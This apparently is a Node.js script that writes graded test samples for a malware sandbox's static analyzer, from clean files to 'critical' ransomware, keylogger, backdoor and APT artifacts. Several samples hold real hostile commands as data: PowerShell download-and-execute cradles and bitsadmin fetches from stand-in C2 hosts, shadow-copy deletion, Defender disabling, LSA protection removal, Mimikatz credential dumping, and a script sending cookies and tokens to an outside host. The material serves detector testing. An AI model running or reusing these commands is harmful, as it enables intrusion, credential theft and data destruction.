// scripts/generate_test_samples.js
const fs = require('fs');
const path = require('path');

const rootDir = path.resolve(__dirname, '..');
const testSamplesDir = path.join(rootDir, 'test_samples');
const sandboxSamplesDir = path.join(rootDir, 'backend', 'sandbox_samples');

function ensureDir(dir) {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
}

// Helper to create a dummy PE file with valid MZ header and PE header offset
function createPEFile({ bufSize = 384, packerName = null, sectionCount = 4, strings = [] }) {
  const buf = Buffer.alloc(bufSize);

  // MZ signature at offset 0
  buf.write('MZ', 0, 'ascii');
  
  // e_lfanew at 0x3C pointing to PE header at 0x80 (128)
  const peOffset = 0x80;
  buf.writeUInt32LE(peOffset, 0x3C);

  // PE signature 'PE\0\0'
  buf.write('PE\x00\x00', peOffset, 'ascii');

  // NumberOfSections at peOffset + 6
  buf.writeUInt16LE(sectionCount, peOffset + 6);

  let currentOffset = peOffset + 24;

  // Optional packer signature
  if (packerName) {
    buf.write(packerName, currentOffset, 'ascii');
    currentOffset += packerName.length + 4;
  }

  // Write embedded strings separated by spaces/nulls
  for (const str of strings) {
    if (currentOffset + str.length + 1 < bufSize) {
      buf.write(str + '\x00', currentOffset, 'ascii');
      currentOffset += str.length + 1;
    }
  }

  return buf;
}

// Helper to create a minimal PDF
function createPDFFile({ title = 'Document', content = '', keywords = [] }) {
  let streamContent = `BT /F1 12 Tf 50 700 Td (${title}) Tj ET\n`;
  if (content) {
    streamContent += `BT /F1 10 Tf 50 680 Td (${content.replace(/[()]/g, '')}) Tj ET\n`;
  }
  for (const kw of keywords) {
    streamContent += `\n% ${kw}\n`;
  }

  const pdf = `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length ${streamContent.length} >>
stream
${streamContent}
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000010 00000 n 
0000000060 00000 n 
0000000117 00000 n 
0000000201 00000 n 
trailer
<< /Size 5 /Root 1 0 R >>
startxref
${300 + streamContent.length}
%%EOF
`;
  return Buffer.from(pdf, 'utf8');
}

console.log('Generating test samples...');

// Ensure directories
const categories = ['01_clean', '02_low_risk', '03_medium_risk', '04_high_risk', '05_critical'];
for (const cat of categories) {
  ensureDir(path.join(testSamplesDir, cat));
}
ensureDir(sandboxSamplesDir);

// ==========================================
// 1. CLEAN SAMPLES (Expected Verdict: CLEAN, Risk Score: 0)
// ==========================================

// 1.1 Clean text document
fs.writeFileSync(
  path.join(testSamplesDir, '01_clean', 'clean_document.txt'),
  `Malware Sandbox Platform - User Manual & Architecture Overview
==============================================================

This is a benign educational document describing sandbox operations.
The application provides static pattern analysis and dynamic behavior emulation.
Everything operates in a safe, controlled environment.

System components:
- Frontend: Vanilla JavaScript, HTML5, CSS tokens
- Backend: Node.js, Express, Socket.IO
- Database: Microsoft SQL Server

All functionality is for demonstration and research purposes only.
`
);

// 1.2 Clean script
fs.writeFileSync(
  path.join(testSamplesDir, '01_clean', 'clean_script.js'),
  `/**
 * Standard utility library for math calculations and string formatting.
 * Benign script without any dynamic code execution or network requests.
 */

function calculateAverage(numbers) {
  if (!Array.isArray(numbers) || numbers.length === 0) return 0;
  const sum = numbers.reduce((acc, val) => acc + val, 0);
  return sum / numbers.length;
}

function formatCurrency(amount, currency = 'USD') {
  return new Intl.NumberFormat('en-US', { style: 'currency', currency }).format(amount);
}

module.exports = { calculateAverage, formatCurrency };
`
);

// 1.3 Clean PDF
fs.writeFileSync(
  path.join(testSamplesDir, '01_clean', 'clean_report.pdf'),
  createPDFFile({
    title: 'Quarterly Security and Performance Report',
    content: 'All systems operational. No unauthorized intrusions detected.'
  })
);

// 1.4 Clean Executable (<500 bytes, standard benign imports)
fs.writeFileSync(
  path.join(testSamplesDir, '01_clean', 'clean_utility.exe'),
  createPEFile({
    bufSize: 384,
    sectionCount: 4,
    strings: [
      'CleanApp.exe',
      'System.Diagnostics.Debug',
      'MessageBoxW',
      'ExitProcess',
      'KERNEL32.dll',
      'USER32.dll'
    ]
  })
);

// ==========================================
// 2. LOW RISK SAMPLES (Expected Verdict: LOW, Risk Score: 1-29)
// ==========================================

// 2.1 Low risk web client (single URL + btoa)
fs.writeFileSync(
  path.join(testSamplesDir, '02_low_risk', 'safe_web_fetch.js'),
  `/**
 * Standard client-side data fetcher with base64 encoding.
 * Uses fetch() and btoa() for safe API consumption.
 */

async function fetchPublicStatus() {
  const response = await fetch('https://api.github.com/zen');
  const text = await response.text();
  const token = btoa(text);
  return token;
}

fetchPublicStatus().then(console.log);
`
);

// 2.2 Low risk diagnostic log with IP
fs.writeFileSync(
  path.join(testSamplesDir, '02_low_risk', 'network_diagnostics.txt'),
  `Network Interface Diagnostics Log:
Adapter 1: Status UP
Assigned Gateway: 192.168.1.1
DNS Primary: 8.8.8.8
Ping statistics: 4 packets transmitted, 4 received, 0% packet loss.
No commands or remote execution flags detected.
`
);

// ==========================================
// 3. MEDIUM RISK SAMPLES (Expected Verdict: MEDIUM, Risk Score: 30-49)
// ==========================================

// 3.1 Macro Document
fs.writeFileSync(
  path.join(testSamplesDir, '03_medium_risk', 'macro_document.docx'),
  `PK\x03\x04
[Content_Types].xml
word/document.xml
word/vbaProject.bin
Sub AutoOpen()
  ' VBA Macro Document with COM automation
  Dim obj As Object
  Set obj = CreateObject("WScript.Shell")
  ' Macro presence indicator
End Sub
`
);

// 3.2 Web scraper with telemetry and cookies
fs.writeFileSync(
  path.join(testSamplesDir, '03_medium_risk', 'web_scraper.js'),
  `/**
 * Script demonstrating web telemetry and session inspection
 */
function inspectSession() {
  const cookieData = document.cookie;
  const localItems = localStorage.getItem('authToken');
  const sessionData = sessionStorage.getItem('sessionId');
  const ws = new WebSocket('wss://telemetry.example.org/stream');
  
  fetch('https://telemetry-sink.example.org/api/collect');
  const fn = new Function('return window')();
  
  ws.onopen = () => {
    ws.send(JSON.stringify({ cookieData, localItems, sessionData, fn: String(fn) }));
  };
}
`
);

// 3.3 Adware injector (calibrated to MEDIUM verdict)
fs.writeFileSync(
  path.join(testSamplesDir, '03_medium_risk', 'adware_injector.js'),
  `/**
 * Adware & beacon tracking script
 * Simulates commercial adware / browser helper telemetry
 */
const adware = 'bundle_v2';

function injectBanners() {
  navigator.sendBeacon('https://ad-tracker.adnetwork.biz/click?id=123', JSON.stringify({ adware }));
  localStorage.setItem('ad_profile', 'user_interest');
}
`
);

// ==========================================
// 4. HIGH RISK SAMPLES (Expected Verdict: HIGH, Risk Score: 50-79)
// ==========================================

// 4.1 Trojan Dropper (child_process + eval + powershell + network download)
const dummyB64 = Buffer.from('powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Write-Host Injected').toString('base64');
fs.writeFileSync(
  path.join(testSamplesDir, '04_high_risk', 'trojan_dropper.js'),
  `/**
 * Trojan Dropper Simulator
 * Triggers child_process execution, dynamic eval, and external payload retrieval
 */
const { exec } = require('child_process');

const remotePayloadUrl = 'http://198.51.100.45/stage2.bin';
const encodedCmd = '${dummyB64}';

function deploy() {
  eval('console.log("Unpacking payload...")');
  atob(encodedCmd);
  exec('powershell.exe -Command ' + atob(encodedCmd));
  fetch(remotePayloadUrl);
}

deploy();
`
);

// 4.2 Stealth Keylogger (PE Executable)
fs.writeFileSync(
  path.join(testSamplesDir, '04_high_risk', 'stealth_keylogger.exe'),
  createPEFile({
    bufSize: 450,
    sectionCount: 5,
    strings: [
      'SetWindowsHookEx',
      'GetAsyncKeyState',
      'GetForegroundWindow',
      'InternetOpen',
      'InternetConnect',
      'HttpSendRequest',
      'http://exfil-logs.darknet.local/keystrokes',
      '203.0.113.88',
      'C:\\Windows\\System32\\svchost.exe',
      'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    ]
  })
);

// 4.3 Worm Propagator (exploit + eternalblue + child_process + network spread + cmd.exe)
fs.writeFileSync(
  path.join(testSamplesDir, '04_high_risk', 'worm_propagator.js'),
  `/**
 * Worm Propagation & Exploit Simulator
 * Targets EternalBlue SMB vulnerability and network propagation
 */
const { exec } = require('child_process');

const targets = ['192.168.1.105', '192.168.1.120', '10.0.0.15'];
const exploit_signature = 'eternalblue_exploit_payload';

function propagateWorm() {
  for (const host of targets) {
    exec('cmd.exe /c powershell.exe -Command Start-Process scan_and_exploit.exe ' + host);
  }
}
`
);

// ==========================================
// 5. CRITICAL SAMPLES (Expected Verdict: CRITICAL, Risk Score: >= 80)
// ==========================================

// 5.1 Ransomware Payload (crypto + data_access + shadow copy delete + multiple commands + persistence)
const longPayload = 'A'.repeat(520);
fs.writeFileSync(
  path.join(testSamplesDir, '05_critical', 'ransomware_payload.js'),
  `/**
 * Ransomware Simulation Script
 * Triggers encryption, data access, volume shadow copy deletion, and extortion note
 */
const { execSync } = require('child_process');

// Packed encrypted payload block
const encryptedBuffer = "${longPayload}";

async function encryptUserFiles() {
  const cryptoSubtle = window.crypto.subtle;
  const targets = ['C:\\Users\\Victim\\Documents', 'C:\\Users\\Victim\\Desktop'];
  const ransomNote = 'README_DECRYPT.txt';
  
  localStorage.setItem('ransom_status', 'encrypted');
  
  // Destructive command execution - multiple command invocations
  execSync('cmd.exe /c vssadmin delete shadows /all /quiet');
  execSync('cmd.exe /c bcdedit /set {default} bootstatuspolicy ignoreallfailures');
  execSync('cmd.exe /c bcdedit /set {default} recoveryenabled no');
  execSync('cmd.exe /c wbadmin delete catalog -quiet');
  execSync('powershell.exe -Command "Stop-Service -Name WinDefend"');
  execSync('powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"');
  
  eval('console.log("Files encrypted with AES-GCM")');
  
  fetch('https://ransom-c2.onion.ws/keys?victim=123');
  fetch('https://ransom-c2.onion.ws/gate.php');
  
  // Registry persistence for ransom note
  const regKey = 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RansomNote';
}
`
);

// 5.2 Process Hollowing Backdoor (PE Executable with UPX + injection + sockets)
fs.writeFileSync(
  path.join(testSamplesDir, '05_critical', 'process_hollowing_backdoor.exe'),
  createPEFile({
    bufSize: 512,
    packerName: 'UPX!',
    sectionCount: 16,
    strings: [
      'OpenProcess',
      'VirtualAllocEx',
      'WriteProcessMemory',
      'CreateRemoteThread',
      'WSAStartup',
      'connect(',
      'send(',
      'recv(',
      'cmd.exe /c powershell.exe -WindowStyle Hidden',
      'http://c2-central.cyberthreat.org/gateway',
      '198.51.100.99',
      'C:\\Windows\\System32\\svchost.exe',
      'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor',
      'shellcode_buffer_alloc'
    ]
  })
);

// 5.3 Malicious PDF Document (Launch + JavaScript + OpenAction + Shell commands + Network + Injection)
fs.writeFileSync(
  path.join(testSamplesDir, '05_critical', 'malicious_exploit.pdf'),
  createPDFFile({
    title: 'Urgent Invoice - Payment Overdue',
    content: 'Please view the embedded attachment.',
    keywords: [
      '/JavaScript',
      '/Launch',
      '/OpenAction',
      '/SubmitForm',
      '/EmbeddedFile',
      '/AA',
      '/RichMedia',
      'cmd.exe /c powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=',
      'cmd.exe /c start /b powershell.exe -w hidden -Command IEX',
      'cmd.exe /c bitsadmin /transfer evil http://malicious-server.xyz/payload.exe C:\\temp\\payload.exe',
      'powershell.exe -ExecutionPolicy Bypass -File C:\\temp\\payload.ps1',
      'URLDownloadToFile http://malicious-server.xyz/dropper.exe',
      'http://malicious-server.xyz/payload',
      '198.51.100.77',
      'OpenProcess',
      'VirtualAllocEx',
      'WriteProcessMemory',
      'CreateRemoteThread',
      'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\PdfUpdater'
    ]
  })
);

// 5.4 Mimikatz Credential Theft & Cobalt Strike Loader
fs.writeFileSync(
  path.join(testSamplesDir, '05_critical', 'mimikatz_loader.txt'),
  `# Advanced Persistent Threat (APT) Artifact
# Credential Theft and Lateral Movement Toolset

Tool References:
mimikatz sekurlsa::logonpasswords
cobalt strike beacon listener
metasploit windows/meterpreter/reverse_tcp

Execution Commands:
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://c2.apt-domain.biz/payload.ps1'))"
cmd.exe /c reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "RunAsPPL" /t REG_DWORD /d 0 /f
cmd.exe /c powershell.exe -Command "Invoke-Mimikatz -DumpCreds"
cmd.exe /c net view /domain

Injected APIs & Shellcode:
CreateRemoteThread
VirtualAllocEx
WriteProcessMemory
OpenProcess
URLDownloadToFile http://c2.apt-domain.biz/module.dll

C2 Network Beacons:
https://c2.apt-domain.biz/submit.php
203.0.113.200
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MimikatzSvc
`
);

// ==========================================
// 6. BACKEND SANDBOX SAMPLES (for Sandbox UI)
// ==========================================

fs.writeFileSync(
  path.join(sandboxSamplesDir, 'clean_sample.txt'),
  `SANDBOX TEST SAMPLE — inert text only
Clean benign configuration file
version: 1.0.0
app: Educational Sandbox Demo
status: operational
`
);

fs.writeFileSync(
  path.join(sandboxSamplesDir, 'backdoor_sample.txt'),
  `SANDBOX TEST SAMPLE — inert text only
Process injection and remote shell simulation:
OpenProcess
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
cmd.exe /c powershell.exe -w hidden
connect(
send(
198.51.100.25:4444
`
);

fs.writeFileSync(
  path.join(sandboxSamplesDir, 'keylogger_sample.txt'),
  `SANDBOX TEST SAMPLE — inert text only
Keystroke interception and spyware telemetry:
cmd.exe /c powershell.exe -w hidden -Command Start-Keylogger
child_process
SetWindowsHookEx
GetAsyncKeyState
GetForegroundWindow
InternetConnect
198.51.100.33
https://exfil-logs.invalid/keys
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\KeyMonitor
`
);

fs.writeFileSync(
  path.join(sandboxSamplesDir, 'ransomware_sample.txt'),
  `SANDBOX TEST SAMPLE — inert text only
Ransomware extortion pattern:
crypto.subtle
README_DECRYPT.txt
cmd.exe /c vssadmin delete shadows /all /quiet
powershell.exe -Command Stop-Service WinDefend
C:\\Users\\Victim\\Documents
https://ransom-c2.invalid/keys
`
);

fs.writeFileSync(
  path.join(sandboxSamplesDir, 'trojan_sample.txt'),
  `SANDBOX TEST SAMPLE — inert text only
powershell.exe -enc VGVzdFRyb2phbg==
child_process
navigator.sendBeacon
https://example.invalid/telemetry
eval('unpack()')
`
);

fs.writeFileSync(
  path.join(sandboxSamplesDir, 'worm_sample.txt'),
  `SANDBOX TEST SAMPLE — inert text only
eternalblue exploit simulation
child_process
192.168.1.50
cmd.exe /c start /b worm.exe
`
);

fs.writeFileSync(
  path.join(sandboxSamplesDir, 'adware_sample.txt'),
  `SANDBOX TEST SAMPLE — inert text only
adware
ad_inject
popunder
navigator.sendBeacon
https://adnetwork.example.invalid/impression
localStorage.setItem('ad_track', 'true')
`
);

fs.writeFileSync(
  path.join(sandboxSamplesDir, 'README.md'),
  `# Safe sandbox samples

Эта папка содержит инертные тестовые образцы для проверки платформы.
Они предназначены исключительно для проверки статического анализатора и поведенческого эмулятора в безопасном окружении. **Код не исполняется на сервере.**

Доступные образцы для тестирования в UI «Песочница»:
- \`clean_sample.txt\` — чистый файл (вердикт CLEAN)
- \`backdoor_sample.txt\` — симуляция бэкдора (сеть + исполнение)
- \`keylogger_sample.txt\` — симуляция кейлоггера (перехват клавиш)
- \`ransomware_sample.txt\` — симуляция вымогателя (шифрование и команды)
- \`trojan_sample.txt\` — симуляция трояна (эксфильтрация данных)
- \`worm_sample.txt\` — симуляция червя (распространение по сети)
- \`adware_sample.txt\` — симуляция рекламного ПО (adware)
`
);

console.log('Sample generation completed successfully.');
